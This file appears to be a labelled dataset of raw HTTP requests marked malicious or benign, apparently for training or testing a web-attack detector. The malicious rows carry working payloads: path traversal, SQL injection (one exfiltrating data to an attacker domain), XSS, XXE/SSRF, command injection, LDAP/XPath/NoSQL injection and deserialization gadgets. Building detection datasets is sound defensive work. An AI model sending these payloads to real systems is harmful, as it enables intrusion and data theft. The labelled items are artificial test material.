label,text
malicious,"GET /oauth/authorize?redirect_uri=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/account/login
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /forum/thread/view?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
DNT: 1
Connection: keep-alive"
benign,"POST /customer/contact HTTP/1.1
Host: rapid-delivery-service.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: https://rapid-delivery-service.co
Referer: https://rapid-delivery-service.co/contact
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15
Cookie: sessionId=lxmw882jdhdne9cnwt73v4mr
Connection: keep-alive

name=Omar+Hassan&email=omar.hassan%40rds.co&subject=Delivery+options&message=Can+I+schedule+a+delivery+outside+normal+business+hours%3F+Thank+you."
malicious,"POST /settings/update HTTP/1.1
Host: secure-access-platform.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://secure-access-platform.org/dashboard
Content-Length: 99
Connection: keep-alive

profile=default&level=user&profile=admin&level=superuser&comment=all+good&comment=%3Csvg+onload%3Dalert%281%29%3E"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: knowledge-base-network.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://knowledge-base-network.io/wiki/Main_Page"
benign,"GET /products/electronics/portable-speaker/details HTTP/1.1
Host: shopwave-online.biz
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html
DNT: 1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: video-streaming-app.dev
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Content-Type: application/json-patch+json
Referer: https://video-streaming-app.dev/user/profile
Content-Length: 81
Connection: keep-alive

[{""op"": ""replace"", ""path"": ""/playback/quality"", ""value"": ""1080p""}]"
benign,"POST /api/user/preferences HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: application/json
Content-Length: 60
Connection: keep-alive

{""favorite_categories"": [""technology"",""travel"",""wellness"",""food"",""literature""]}"
benign,"POST /orders/new HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json
Origin: https://online-retail-store.biz
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.vwx234yzb567abc890def123
X-CSRF-Token: 5bd7e4c1a0925dde34f1
X-Requested-With: FetchAPIClient
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1
Content-Length: 74

{""items"":[{""itemId"":982,""quantity"":2},{""itemId"":446,""quantity"":1}],""paymentMethod"":""card""}"
malicious,"POST /app/user/settings HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-requests/2.25.1
Accept: application/json, text/javascript, */*; q=0.01
X-Session-Pickle: \x80\x03cnative\npopen\nq\x00X\x10\x00\x00\x00id;-\x63\x00\x85q\x01Rq\x02.
Content-Type: application/json
Content-Length: 36

{""settings"":{""theme"":""dark""}}"
benign,"PUT /v3/settings/update HTTP/1.1
Host: api.smart-home-hub.ai
Authorization: Token e7a9436d95283f04a7fa2e4b92c7c1d3
Content-Type: application/json
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; Pixel 5 Build/RQ3A.210905.001)
Accept: application/json
Content-Length: 124
Connection: close

{""deviceId"":""hub-01a"",""settings_b64"":""eyJsaWdodCI6ICJhZnRlciIsICJ0ZW1wIjogMjMuNSwgImZhbl9vZmZfc2V0dGluZ3MiOiBbIm9uIiwgIm9mZiJdfQ==""}"
benign,"GET /api/v2/xml/products?category=home-garden&available=true HTTP/1.1
Host: fresh-market-online.store
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /v1/device/configure HTTP/1.1
Host: smart-home-central.io
Authorization: Bearer NMxDL4sqRQ7Pwl09adZG1737fjpXUvH8Et1oK9ReU
Content-Type: application/json
Accept: application/json
User-Agent: python-requests/2.28.2
Content-Length: 125
Connection: keep-alive

{""device.config.mode"":""auto"",""settings['temperature_threshold']"":22.5,""schedule.days-active"":[""mon"",""wed"",""fri""],""user-preferences['alerts_enabled']"":true}"
benign,"PUT /usr/data/records/5498 HTTP/1.1
Host: secure-data-retention.io
Authorization: Bearer 0e2fa04354ffc972f473a79b8c44c8c2
Content-Type: application/json
Accept: application/json
Origin: https://portal.secure-data-retention.io
X-Requested-With: XMLHttpRequest
User-Agent: curl/7.79.1
Content-Length: 56
Connection: keep-alive

{""archiveStatus"":""completed"",""retentionPeriod"":""5_years""}"
malicious,"GET /download?file=../../../../../../../../etc/passwd HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Origin: https://secure-user-portal.net
Connection: keep-alive"
malicious,"GET /public/assets/..%2F..%2Fconf%2Fsettings.ini HTTP/1.1
Host: fileshare-mediahub.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://fileshare-mediahub.io/gallery/view"
benign,"OPTIONS /v2/inventory/items/45129 HTTP/1.1
Host: backend.shopfast-cloud.com
Origin: https://profile.social-gaminghub.org
Access-Control-Request-Method: DELETE
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /resource/load?file=content/tutorials/html/basics.html HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: python-requests/2.28.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en
Connection: keep-alive"
malicious,"POST /soap/xmlservice/Load HTTP/1.1
Host: api.solutions-global.net
Content-Type: application/xml
Content-Length: 705
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/xml
SOAPAction: ""http://api.solutions-global.net/IService/LoadSerializedObject""

<?xml version=""1.0"" encoding=""UTF-8""?>
<serviceRequest>
  <objectData><![CDATA[AAEAAAD/////AQAAAAAAAAAxAgAAAEdTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAQAIVGVzdE9iamVjdAAEAFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzAQAAAFN0YXJ0AQMFAAAAU3lzdGVtLkNvbmZpZ3VyYXRpb24uSW5zdGFsbC5Bc3NlbWJseUluc3RhbGxlcg==]]></objectData>
</serviceRequest>"
benign,"GET /product/beauty/skincare/face-serums/904 HTTP/1.1
Host: pure-beauty-supply.info
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.8
Referer: https://pure-beauty-supply.info/products/beauty/skincare
Cookie: sid=bf2c9f7351d9a; cartSessionId=cart01478bd0c2
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Mobile Safari/537.36"
malicious,"POST /auth/login HTTP/1.1
Host: cloud-sync-solutions.me
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 72

username=alice&password=pass123'}); db.sessions.remove({user:'admin'}); //"
benign,"POST /api/v1/import/products HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.85.0
Accept: */*
Content-Type: text/csv
Content-Length: 124
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.exampletokenabc123
Connection: keep-alive

product_id,category,price,stock
1001,books,15.49,120
1002,kitchen,23.99,58
1003,outdoor,99.99,10"
malicious,"GET /dashboard/home HTTP/1.1
Host: enterprise-analytics-suite.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
X-SSL-Version: SSLv3
Accept-Language: en-US,en;q=0.9"
malicious,"GET /api/proxy?url=http://127.0.0.1:8080/admin/ HTTP/1.1
Host: service-tunneling-hub.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.7
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
malicious,"POST /events/register HTTP/1.1
Host: event-hub.real-time-messaging.tv
User-Agent: Wget/1.21.1
Accept: text/plain
Content-Type: application/json
X-Webhook-URL: http://rebind-dns-callout.internal-net.cloud/multi_stage
Content-Length: 29

{""event"": ""user_signup"", ""id"":42}"
malicious,"GET /products/view?id=589 HTTP/1.1
Host: elitefitnessgear.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: user_id=789; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0)#
Referer: https://elitefitnessgear.info/home"
benign,"POST /user/newsletter/subscribe HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A725F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.89 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
DNT: 1
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/home
Connection: keep-alive

email=emily.carlson%2Bnews%40secureup.net"
benign,"HEAD /index.html HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: application/json
X-Forwarded-For: 203.0.113.45
Connection: keep-alive"
benign,"GET /search/resources/documentation?query=rest+api+pagination&version=v2.1&sort=relevance&language=en&include_examples=true&page=5&limit=10&filter=stable&format=pdf&access=public&topic=authentication&search_in=title,summary HTTP/1.1
Host: docs-developers-hub.net
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept: application/pdf,application/msword
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
Referer: https://docs-developers-hub.net/resources/"
malicious,"POST /api/user/feedback HTTP/1.1
Host: feedback-service-cloud.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 165
Accept: */*
Referer: https://dashboard.feedback-service-cloud.ai/feedback

userid=987654&rating=5&comments=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E&session=active"
benign,"POST /submit/feedback HTTP/1.1
Host: feedback-service.global-net.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
Connection: keep-alive
Referer: https://feedback-service.global-net.biz/form
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Language: en-US,en;q=0.7
Origin: https://feedback-service.global-net.biz

user_id=55678&rating=5&comments=Exceptional+service+and+support.&redirect_uri=https%3A%2F%2Ffeedback-service.global-net.biz%2Fthanks"
malicious,"POST /account/lookup HTTP/1.1
Host: enterprise-cloud-solutions.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: application/json
Accept-Charset: utf-8
Content-Type: application/json
Content-Length: 137
Origin: https://enterprise-cloud-solutions.ai
Cookie: session=9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d

{""query"": ""/users/user[username='admin' and starts-with(password,'p')]/userID""}"
benign,"PUT /user/settings HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6ImFjY2VzcyJ9.ZW5jb2RlZFRva2Vu
Content-Type: application/json
Accept: application/json, text/plain
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Content-Length: 95

{""email"":""emily.watson@datacloud.ai"",""role"":""user"",""notifications"":true,""theme"":""dark"",""isAdmin"":false}"
benign,"POST /photos/multi-upload HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----BoundaryXYZ1234
Content-Length: 987

------BoundaryXYZ1234
Content-Disposition: form-data; name=""upload[]""; filename=""concept_art1.jpeg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
------BoundaryXYZ1234
Content-Disposition: form-data; name=""upload[]""; filename=""concept_art2.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
------BoundaryXYZ1234--"
benign,"GET /stylesheets/main.css HTTP/1.1
Host: interactive-learning-platform.edu
User-Agent: Wget/1.19.5 (linux-gnu)
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.7
Connection: close"
malicious,"GET /pages/user_home.shtml?user_greeting=Good%20Day<!--#echo%20var=""REMOTE_USER""--> HTTP/1.1
Host: portal-secure-cloud.biz
User-Agent: Wget/1.21.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Pragma: no-cache
Connection: keep-alive"
benign,"POST /api/v1/js/analyticsTracker.js HTTP/1.1
Host: data-insights.updates.biz
Content-Type: application/javascript
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: application/javascript, */*;q=0.8
Content-Length: 36
Pragma: no-cache

console.log('Tracking event count incremented');"
benign,"GET /api/v4/blog/posts?tag=technology&limit=10 HTTP/1.1
Host: content-feed.my-personal-blog-site.info
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.7
X-API-Key: 8ePZoFUa76tpMlq1vOJLDc4AD9XH5UBV
Connection: keep-alive"
malicious,"POST /user/login HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://online-retail-store.biz
Content-Length: 58
Connection: keep-alive

username=shopper%00%01%00<script>fetch('/steal')</script>&password=secret"
benign,"GET /sitemap.xml HTTP/1.1
Host: pixeltrailstudios.org
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: application/xml, text/xml
Accept-Encoding: br, gzip, deflate
Connection: keep-alive"
malicious,"POST /v1/serialize HTTP/1.1
Host: interactive-serialization.io
User-Agent: Java/1.8.0_291
Content-Type: application/json
Accept: */*
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 298

{
  ""b64_java_object"": ""rO0ABXNyABtqYXZhLmxhbmcuUnVudGltZQAAAAAAAAABAgAAFw==org.apache.commons.collections.functors.InvokerTransformerjava.lang.Runtime.exec""
}"
benign,"HEAD /index.html HTTP/1.1
Host: webinar-registration-platform.co
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
X-Forwarded-For: 198.51.100.23"
benign,"DELETE /api/v1/blog/articles/71d23e HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer O3IZeP4SQaxJ5qGkYbErTcF18XdlWM9fjLvPHzN0
Accept: application/json
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1
Cache-Control: no-cache
Connection: keep-alive"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.81.0
Accept: */*
X-Forwarded-For: 192.168.10.41
Connection: close"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Content-Length: 39
Origin: https://online-retail-store.biz
Connection: keep-alive

{""filePath"": ""/home/admin/.bash_history""}"
benign,"POST /auth/password/reset_request HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://community.game-dev-forum.org/login
Origin: https://community.game-dev-forum.org
Connection: keep-alive

email=lucas.martin%40community.game-dev-forum.org"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: data-api.cloud-storage.ai
Accept: */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.sampletoken.example
User-Agent: curl/7.85.0
Connection: close"
benign,"GET /learn/tutorials/basic-html HTTP/1.1
Host: code-academy-cloud.dev
Accept: text/html,application/xhtml+xml,application/xml
Connection: keep-alive
Cookie: last_read_b64=eyJ0dXRvcmllcyI6WyJpbWFnZXMiLCJtb3ZpZXMiXSwicGxheWJhY2siOlt7Im5hbWUiOiJCdXR0b24gUHJpbWUiLCJzdGF0dXMiOiJjb21wbGV0ZSJ9XX0=; visited=true
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-US,en;q=0.6"
benign,"GET /blog/article/view/2567 HTTP/1.1
Host: my-personal-blog-site.info:3002
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://my-personal-blog-site.info/blog
Connection: keep-alive"
benign,"POST /api/v2/control/robot HTTP/1.1
Host: robotics-lab-center.org
User-Agent: python-requests/2.28.1
Content-Type: application/json
Accept: application/json
Authorization: Token 5f2d7bb474f3c45a9bfa
Content-Length: 61

{""command"":""rotate_arm"",""parameters"":{""direction"":""clockwise"",""degree"":90}}"
malicious,"GET /api/v3/user/profile?userId=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%27%5C%5C%5C%5C%27%2C%28SELECT%2520version%28%29%29%2C%27.attacker-domain.com%5C%5Cdata%27%29%29%29--%2520 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Pragma: no-cache
Cookie: authid=ab12cd34ef56gh78ij90kl12mn34op56
Origin: https://portal.api.cloud-data-services.ai"
benign,"POST /api/log HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: text/plain
Origin: https://my-personal-blog-site.info
User-Agent: python-requests/2.28.1
Content-Length: 50

event:comment_posted&postId=1453&user=reader87&approved=true"
benign,"GET /images/backgrounds/homepage-header.jpg HTTP/1.1
Host: digital-marketing-media.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: br
If-None-Match: ""970cdab3b7""
Referer: https://digital-marketing-media.org/campaign-fall
Connection: keep-alive"
benign,"POST /app/user/settings HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Referer: https://secure-user-portal.net/dashboard
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.bXl1c2Vy.QWErtYU345UIoJHG2r4
Content-Length: 92

{""settings"":{""email_notifications"":false,""dark_mode"":true,""locale"":""en_GB"",""privacy_level"":""high""}}"
benign,"GET /icons/icons-set/animal-icons.avif HTTP/1.1
Host: eco-products-catalog.ai
Accept: image/avif,image/webp,*/*
DNT: 1
Referer: https://eco-products-catalog.ai/homepage
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_15_7; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /search?q=how%20to%20bake%20bread HTTP/1.1
Host: hobby-cooks-network.org
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
X-Forwarded-For: 203.0.113.34"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/xml
Content-Length: 210
Referer: https://community.game-dev-forum.org/settings
Connection: keep-alive

<?xml version=""1.0""?>
<!DOCTYPE settings [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:9000/internal_api"" >
]>
<settings>
  <note>&xxe_ssrf;</note>
</settings>"
benign,"GET /static/css/dashboard-theme-v3.css HTTP/1.1
Host: smart-city-infrastructure.gov
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://smart-city-infrastructure.gov/reports/monthly
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
DNT: 1"
benign,"GET /news/2024/07/15/latest-updates HTTP/1.1
Host: global-tidings.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.8
Accept-Language: en-GB,en;q=0.9,es;q=0.6
Accept-Encoding: gzip, deflate
Referer: https://global-tidings.net/
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; session=abcd1234efgh5678
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-CH-UA: ""Safari"";v=""16"", ""Not-A.Brand"";v=""99"", ""Apple"";v=""16""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""macOS""
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document"
benign,"GET /forum/topic/45023/page/3 HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml;q=0.9
Accept-Encoding: gzip, deflate, br
DNT: 1
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/"
benign,"POST /theme/js/custom-theme-updater.js HTTP/1.1
Host: styled-ui.network
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Content-Type: application/javascript
Content-Length: 31
Accept: */*
Referer: https://styled-ui.network/dashboard
Connection: keep-alive

console.log('Theme updater started');"
malicious,"GET /network/diagnostics/trace/192.168.1.1%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: sysops-infra-monitoring.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Connection: close"
malicious,"POST /user/search HTTP/1.1
Host: directory-access-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://directory-access-secure.net/login
Content-Length: 53
Connection: keep-alive

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*"
